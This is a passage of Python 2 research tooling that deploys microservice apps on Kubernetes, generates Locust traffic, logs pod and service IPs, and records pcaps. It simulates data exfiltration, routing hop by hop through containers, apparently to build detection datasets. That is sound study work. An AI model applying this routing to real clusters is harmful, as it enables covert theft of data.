    #print current_class_name, current_loc_in_exfil_path+1, len(exfil_path)
    if current_loc_in_exfil_path+1 == len(exfil_path):
        src = None
    else: # then it has src other than itself
        prev_class_in_path = exfil_path[current_loc_in_exfil_path + 1]
        #print selected_container
        # iterate through selected_containers[prev_class_in_path] and append the IP's (seems easy but must wait until done w/ experiments)
        # containers must be on same network to communicate...
        prev_class_networks = class_to_networks[prev_class_in_path]
        prev_and_current_class_network = list( set(current_class_networks) & set(prev_class_networks))[0] # should be precisely one
        prev_instance = selected_container[prev_class_in_path]
        #print 'nneettss', prev_instance, selected_container[current_class_name]
        #print current_class_name, current_class_networks
        #print prev_class_in_path, prev_class_networks

        # now retrieve the previous container's IP for the correct network
        #print "finding previous ip in exfiltration path...", proxy_instance_to_networks_to_ip[prev_instance], prev_instance.name
        #print prev_and_current_class_network.name, [i.name for i in proxy_instance_to_networks_to_ip[prev_instance]]
        prev_instance_ip = proxy_instance_to_networks_to_ip[prev_instance][prev_and_current_class_network]
        src = prev_instance_ip

    # at last microservice hop -> next dest is local host
    if current_loc_in_exfil_path == 0:
        next_instance_ip = localhostip
        dest = next_instance_ip
    else: # then it'll hop through another microservice
        # then can just pass to another proxy in the exfiltration path

        # going to want to do the same tpye of thing (follow the example of the code above)
        next_class_in_path = exfil_path[current_loc_in_exfil_path - 1]
        next_class_networks = class_to_networks[next_class_in_path]
        next_and_current_class_network = list(set(current_class_networks) & set(next_class_networks))[0]  # should be precisly one 
        next_instance = selected_container[next_class_in_path]
        #print "next_and_current_class_network", next_and_current_class_network
        next_instance_ip = proxy_instance_to_networks_to_ip[next_instance][next_and_current_class_network]
        dest = next_instance_ip

    return dest, src

def aggregate_locust_file(locust_csv_file, aggregate_locust_csv_file):
    with open(locust_csv_file, 'r') as f:
        cont = f.read()
    with open(aggregate_locust_csv_file, 'a+') as f:
        f.seek(0, 2)
        f.write('\n######################\n')
        f.writelines(cont)

# note, requests means requests that succeeded
def sanity_check_locust_performance(locust_csv_file):
    method_to_requests = {}
    method_to_fails = {}
    with open(locust_csv_file, 'r') as locust_csv:
        reader = csv.reader(locust_csv)
        for row in reader:
            try: # then it is a line with data
                int(row[2])
                #print "real vals", row
            except: # then it is a line w/ just the names of the columns
                #print "header", row
                continue
            if row[0] == "None":
                method_to_requests[(row[0], row[1])] = row[2]
                method_to_fails[(row[0], row[1])] = row[3]
    total_requests = 0
    total_fails = 0
    for method in method_to_requests.keys():
        total_requests += int(method_to_requests[method])
        total_fails += int(method_to_fails[method])
    try:
        fail_percentage = float(total_fails) / float(total_requests)
    except ZeroDivisionError:
        fail_percentage = 0
    return total_requests, total_fails, fail_percentage

# note: this function exists b/c there are lots of staments scattered around that print stuff to current
# directory, and I want to move all of that info into the experimental folder. Probably easiest just to check
# if the experiment name is in the file name and then move it accordingly
def copy_experimental_info_to_experimental_folder(exp_name):
    for filename in os.listdir('./'):
        #print "found_filename", filename, "    ", "exp_name", exp_name, exp_name in filename
        if exp_name in filename:
            #print "exp_name_in_filename", filename
            if 'creation_log' in filename or 'json' in filename or 'pcap' in filename:
                shutil.move("./"+filename, './experimental_data/' + exp_name + '/' + filename)
            else:
                shutil.move("./"+filename, './experimental_data/' + exp_name + '/debug/' + filename)

# def generate_analysis_json ??? -> ??
# this function generates the json that will be used be the analysis_pipeline pipeline
def generate_analysis_json(path_to_exp_folder, analysis_json_name, exp_config_json, exp_name, physical_exfil_p):
    # okay, so what I want is just a dict with the relevant values...

    analysis_dict = {}

    analysis_dict["application_name"] = exp_config_json["application_name"]
    analysis_dict["experiment_name"] = exp_config_json["experiment_name"]
    analysis_dict["experiment_length_sec"] = exp_config_json["experiment_length_sec"]

    if "network_plugin" in exp_config_json:
        analysis_dict["network_plugin"] = exp_config_json["network_plugin"]
    else:
        analysis_dict["network_plugin"] = "none"

    try:
        analysis_dict["setup"] = {}
        analysis_dict["setup"]["number_customer_records"] = exp_config_json["setup"]["number_customer_records"]
        analysis_dict["setup"]["number_background_locusts"] = exp_config_json["setup"]["number_background_locusts"]
        analysis_dict["setup"]["background_locust_spawn_rate"] = exp_config_json["setup"]["background_locust_spawn_rate"]
    except: # some of the setups handle app seteup seperately
        pass

    analysis_dict["experiment"] = {}
    analysis_dict["experiment"]["number_background_locusts"] = exp_config_json["experiment"]["number_background_locusts"]
    analysis_dict["experiment"]["background_locust_spawn_rate"] = exp_config_json["experiment"]["background_locust_spawn_rate"]
    try:
        analysis_dict["experiment"]["traffic_type"] = exp_config_json["experiment"]["traffic_type"]
    except:
        analysis_dict["experiment"]["traffic_type"] = "normal"

    try:
        analysis_dict["prob_distro"] = exp_config_json["prob_distro"]
    except:
        pass

    analysis_dict["exfiltration_info"] = {}
    analysis_dict["exfiltration_info"]["sensitive_ms"] = exp_config_json["exfiltration_info"]["sensitive_ms"]
    analysis_dict["exfiltration_info"]["physical_exfil_performed"] = physical_exfil_p

    if physical_exfil_p:
        try:
            analysis_dict["exfiltration_info"]["exfiltration_path_class_which_installer"] = exp_config_json["exfiltration_info"]["exfiltration_path_class_which_installer"]
            analysis_dict["exfiltration_info"]["exfil_paths"] = exp_config_json["exfiltration_info"]["exfil_paths"]
            analysis_dict["exfiltration_info"]["folder_to_exfil"] = exp_config_json["exfiltration_info"]["folder_to_exfil"]
            analysis_dict["exfiltration_info"]["regex_of_file_to_exfil"] = exp_config_json["exfiltration_info"]["regex_of_file_to_exfil"]
            analysis_dict["exfiltration_info"]["exfil_methods"] = exp_config_json["exfiltration_info"]["exfil_methods"]
            analysis_dict["exfiltration_info"]["exfil_protocols"] = exp_config_json["exfiltration_info"]["exfil_protocols"]
            analysis_dict["exfiltration_info"]["exfil_StartEnd_times"] = exp_config_json["exfiltration_info"]["exfil_StartEnd_times"]
            analysis_dict["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"] = exp_config_json["exfiltration_info"]["DET_min_exfil_data_per_packet_bytes"]
            analysis_dict["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"] = exp_config_json["exfiltration_info"]["DET_max_exfil_data_per_packet_bytes"]
            analysis_dict["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"] = exp_config_json["exfiltration_info"]["DET_avg_exfiltration_rate_KB_per_sec"]
            analysis_dict["exfiltration_info"]["sec_between_exfil_pkts"] = exp_config_json["exfiltration_info"]["sec_between_exfil_pkts"]
            analysis_dict['exfiltration_info']['sec_between_exfil_pkts'] = exp_config_json["exfiltration_info"]["sec_between_exfil_pkts"]
        except:
            pass # exfil must not be being simulated during this experiment

    try:
        analysis_dict['Deploymenet'] = exp_config_json["Deploymenet"]
    except:
        pass

    #try:
    #    analysis_dict['split_pcap'] = exp_config_json["split_pcap"]
    #except:
    #    pass

    try:
        analysis_dict["exfil_path_class_to_image"] = exp_config_json["exfil_path_class_to_image"]
    except:
        pass

    analysis_dict["pod_creation_log_name"] = exp_name  + '_cluster_creation_log.txt'
    analysis_dict["pcap_file_name"] = exp_name + '_bridge_any.pcap'

    analysis_dict['minikube_ip'] = get_IP(orchestrator)

    # this logs the relevant interfaces so we can know what is and isn't on the cluster
    # (this'll be useful in the analysis pipeline)
    try:
        VM_interfaces_info = {}
        VM_interfaces = exp_config_json["VM_interfaces"]
        for interface in netifaces.interfaces():
            if netifaces.AF_INET in netifaces.ifaddresses(interface):
                if interface in VM_interfaces:
                    VM_interfaces_info[interface] = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]
        analysis_dict["VM_interfaces_info"] = VM_interfaces_info
    except:
        pass

    json_path = path_to_exp_folder + analysis_json_name
    r = json.dumps(analysis_dict, indent=4)
    with open(json_path, 'w') as f:
        f.write(r + "\n" )

def setup_directories(exp_name):
    # first want an ./experimental_data directory
    try:
        os.makedirs('./experimental_data')
    except OSError:
        if not os.path.isdir('./experimental_data'):
            raise

    # then want the directory to store the results of this experiment in
    # but if it already exists, we'd want to delete it, so that we don't get
    # overlapping results confused
    if os.path.isdir('./experimental_data/' + exp_name):
        shutil.rmtree('./experimental_data/' + exp_name)
    os.makedirs('./experimental_data/'+exp_name)
    os.makedirs('./experimental_data/'+exp_name+'/edgefiles/')
    os.makedirs('./experimental_data/'+exp_name+'/graphs/')
    os.makedirs('./experimental_data/'+exp_name+'/alerts')
    os.makedirs('./experimental_data/'+exp_name+'/debug')
    print "Just setup directories!"

def get_ip_and_port(app_name, use_k3s_cluster):
    # TODO: make sure works with k3s...

    if use_k3s_cluster:
        global set_ip, set_port
        return set_ip, set_port
    else:
        print "get_ip_and_port", app_name
        out = None
        if app_name == 'sockshop':
            out = subprocess.check_output(['minikube', 'service', 'front-end',  '--url', '--namespace=sock-shop', "--wait", "120"])
        elif app_name == 'wordpress':
            # step 1: get the appropriate ip / port (like above -- need for next step)
            out = subprocess.check_output(['minikube', 'service', 'wwwppp-wordpress',  '--url', "--wait", "120"])
        elif app_name == 'hipsterStore':
            out = subprocess.check_output(['minikube', 'service', 'frontend-external', '--url', "--wait", "120"])
        elif app_name == 'robot-shop':
            out = subprocess.check_output(["minikube", "service", "web", "--url", "--namespace=robot-shop", "--wait" ,"120"])

        else:
            pass
        print "out",out
        minikube_ip, front_facing_port = out.split(' ')[-1].split('/')[-1].rstrip().split(':')
        print "minikube_ip", minikube_ip, "front_facing_port", front_facing_port
        return minikube_ip, front_facing_port

def cluster_creation_logger(log_file_loc, end_sentinal_file_loc, start_sentinal_file_loc, exp_name):
    time_behind = 0.0 # records how much time the system is behind where it should be
    timestep_counter = 0
    time_step_to_changes = {}

    pod_stream_file = exp_name + "_pod_stream.txt"
    svc_stream_file = exp_name + "_svc_stream.txt"

    # step 1: clear file
    try:
        os.remove(pod_stream_file)
    except OSError:
        pass
    try:
        os.remove(svc_stream_file)
    except OSError:
        pass


    # step 2: start streaming the relevant kubernetes info::
    i_filehandler = open(pod_stream_file, 'w+')
    h_filehander =  open(svc_stream_file, 'w+')

    pod_process = subprocess.Popen(['kubectl', 'get', 'po', '-o', 'wide', '--all-namespaces', '--show-labels', '-w'],
                                   stdout=i_filehandler)
    svc_process = subprocess.Popen(['kubectl', 'get', 'svc', '-o', 'wide', '--all-namespaces', '--show-labels', '-w'],
                                   stdout=h_filehander)

    ###
    furthest_pod_line = 1
    furthest_svc_line = 1

    while not os.path.exists(start_sentinal_file_loc):
        time.sleep(0.3)

    while (not os.path.exists(end_sentinal_file_loc)):
        cur_pod_line = 0
        cur_svc_line = 0
        with open(pod_stream_file, 'r') as f:
            with open(svc_stream_file, 'r') as j:
                #print "current_loop: ", timestep_counter
                loop_starttime = time.time()
                current_mapping = {}

                # using technique from https://stackoverflow.com/questions/10140281/how-to-find-out-whether-a-file-is-at-its-eof
                for line in f:
                    if len(line) < 8:
                        print "line is too short!", line
                    if line != '' and cur_pod_line >= furthest_pod_line:
                        line = [i for i in line.split('   ') if i != '']
                        name = line[1].rstrip().lstrip()
                        ip = line[6].rstrip().lstrip()
                        namespace = line[0].rstrip().lstrip()
                        labels = line[8].rstrip().lstrip()
                        status = line[3].rstrip().lstrip()
                        if '<none>' not in ip:
                            current_mapping[name] = (ip, namespace, 'pod', labels, status)
                    cur_pod_line += 1
                #print "cur_pod_line", cur_pod_line
                furthest_pod_line = cur_pod_line

                #out = subprocess.check_output(['kubectl', 'get', 'svc', '-o', 'wide', '--all-namespaces', '--show-labels'])
                for line in j:
                    if line != '' and cur_svc_line >= furthest_svc_line:
                        line = [i for i in line.split('   ') if i != '']
                        name = line[1].rstrip().lstrip()
                        ip = line[3].rstrip().lstrip()
                        namespace = line[0].rstrip().lstrip()
                        labels = line[7].rstrip().lstrip()
                        status = line[3].rstrip().lstrip()
                        current_mapping[name] = (ip, namespace, 'svc', labels, status)
                    cur_svc_line += 1
                #print "furthest_svc_line", furthest_svc_line
                furthest_svc_line = cur_svc_line

                # now compare to old mapping
                changes_this_time_step = {}
                for cur_name, cur_ip in current_mapping.iteritems():
                    #if cur_name not in last_timestep_mapping:
                    ## note: we'll just log everything here and then be more precise in the analysis_pipeline
                    changes_this_time_step[cur_name] = (cur_ip[0], '+', cur_ip[1], cur_ip[2], cur_ip[3], cur_ip[4])
                #for last_name,last_ip_tup in last_timestep_mapping.iteritems():
                #    if last_name not in current_mapping:
                #        changes_this_time_step[last_name] = (last_ip_tup[0], '-', last_ip_tup[1], last_ip_tup[2], last_ip_tup[3])

                ## https://kubernetes.io/docs/concepts/services-networking/service/
                ## 'The set of Pods targeted by a Service is (usually) determined by a Label Selector
                ## (see below for why you might want a Service without a selector)."

                time_step_to_changes[timestep_counter] = changes_this_time_step

                with open(log_file_loc, 'wb') as f:  # Just use 'w' mode in 3.x
                    f.write(pickle.dumps(time_step_to_changes))

                if timestep_counter % 1000 == 0:
                    # note: need to restart the watch command periodically. this'll lead to some duplicated content,
                    # but shouldn't be a big deal
                    pod_process.kill()
                    svc_process.kill()
                    i_filehandler.close()
                    h_filehander.close()
                    i_filehandler = open(pod_stream_file, 'w')
                    h_filehander = open(svc_stream_file, 'w')
                    pod_process = subprocess.Popen(
                        ['kubectl', 'get', 'po', '-o', 'wide', '--all-namespaces', '--show-labels', '-w'],
                        stdout=i_filehandler)
                    svc_process = subprocess.Popen(
                        ['kubectl', 'get', 'svc', '-o', 'wide', '--all-namespaces', '--show-labels', '-w'],
                        stdout=h_filehander)
                    furthest_pod_line = 1
                    furthest_svc_line = 1

                time_to_sleep = 1.0 - (time.time() - loop_starttime) - time_behind
                if time_to_sleep < 0.0:
                    print "time_to_sleep", time_to_sleep
                    time_behind = abs(time_to_sleep)
                else:
                    time_behind = 0.0

                if int(time_to_sleep) < 0.0:
                    print "skipping: ", abs(int(time_to_sleep))
                    # if we are falling behind, then we need to skip if necessary
                    for i_filehandler in range(1, abs(int(time_to_sleep)) + 1):
                        time_step_to_changes[timestep_counter + i_filehandler] = {}
                        timestep_counter += 1

                    time_behind -= 2 * abs(int(time_to_sleep))
                else:
                    time_to_sleep = max(0.0, time_to_sleep)
                    time.sleep(time_to_sleep)
                timestep_counter += 1
                #last_timestep_mapping = current_mapping

    ### then kill the subprocesses here
    pod_process.terminate()
    pod_process.kill()
    svc_process.terminate()
    svc_process.kill()
    print "hi there"

if __name__=="__main__":
    print "RUNNING"

    parser = argparse.ArgumentParser(description='Creates microservice-architecture application pcaps')

    parser.add_argument('--exp_name',dest="exp_name", default=None)
    parser.add_argument('--config_file',dest="config_file", default='configFile')
    parser.add_argument('--prepare_app_p', dest='prepare_app_p', action='store_true',
                        default=False,
                        help='sets up the application (i.e. loads db, etc.)')
    parser.add_argument('--port',dest="port_number", default=None)
    parser.add_argument('--ip',dest="vm_ip", default=None)
    parser.add_argument('--docker_daemon_port',dest="docker_daemon_port", default='2376')
    parser.add_argument('--no_exfil', dest='exfil_p', action='store_false',
                        default=True,
                        help='do NOT perform exfiltration (default is to perform it)')
    parser.add_argument('--post_process_only', dest='post_process_only', action='store_true',
                        default=False,
                        help='(dev purposes only) assume that the PCAPs are locally stored and then do the post-processing to them...')
    parser.add_argument('--use_k3s_cluster', dest='use_k3s_cluster', action='store_true',
                        default=False,
                        help='Instead of using the minikube k8s cluster, use the k3s k8s cluster instead (in development ATM)')
    parser.add_argument('--return_after_prepare_p', dest='return_after_prepare_p', action='store_true',
                        default=False,
                        help="Return right after deploying application (doesn't make sense without --prepare_app_p)")

    #  localhost communicates w/ vm over vboxnet0 ifconfig interface, apparently, so use the
    # address there as the response address, in this case it seems to default to the below
    # value, but that might change at somepoints
    parser.add_argument('--localhostip',dest="localhostip", default="192.168.99.1")
    parser.add_argument('--localport',dest="localport", default="80")

    args = parser.parse_args()

    if args.localhostip != "192.168.99.1": # and args.localport != "80":
        global set_ip, set_port
        set_ip = args.localhostip
        set_port = args.localport

    print args.exp_name, args.config_file, args.prepare_app_p, args.port_number, args.vm_ip, args.localhostip, args.exfil_p

    print os.getcwd()
    with open(args.config_file) as f:
        config_params = json.load(f)
    orchestrator = "kubernetes"

    if not args.vm_ip:
        ip = get_IP(orchestrator)
    else:
        ip = args.vm_ip

    # need to setup some environmental variables so that the docker python api will interact with
    # the docker daemon on the docker machine
    docker_host_url = "tcp://" + ip + ":" + args.docker_daemon_port
    print "docker_host_url", docker_host_url
    os.environ['DOCKER_HOST'] = docker_host_url
    os.environ['DOCKER_TLS_VERIFY'] = "1"

    if args.exp_name:
        setup_directories(args.exp_name)
        exp_name = args.exp_name
    else:
        with open(args.config_file) as f:
            config_params = json.load(f)
            setup_directories(config_params['experiment_name'])
            exp_name = config_params['experiment_name']

    if args.port_number:
        port_number = int(args.port_number)
    else:
        port_number = args.port_number

    path_to_docker_machine_tls_certs = ''
    with open(args.config_file) as f:
        config_params = json.load(f)
        generate_analysis_json('./experimental_data/' + exp_name + '/', exp_name + '_analysis.json', config_params,
                               exp_name, args.exfil_p)
        path_to_docker_machine_tls_certs = config_params["path_to_docker_machine_tls_certs"]

    if not args.use_k3s_cluster:
        print "path_to_docker_machine_tls_certs", path_to_docker_machine_tls_certs
        os.environ['DOCKER_CERT_PATH'] = path_to_docker_machine_tls_certs
        client =docker.from_env()
        exfil_p = args.exfil_p
    else:
        client=None
        exfil_p = False

    main(exp_name, args.config_file, args.prepare_app_p, None, None, args.localhostip, exfil_p, args.post_process_only,
         args.use_k3s_cluster, args.return_after_prepare_p)
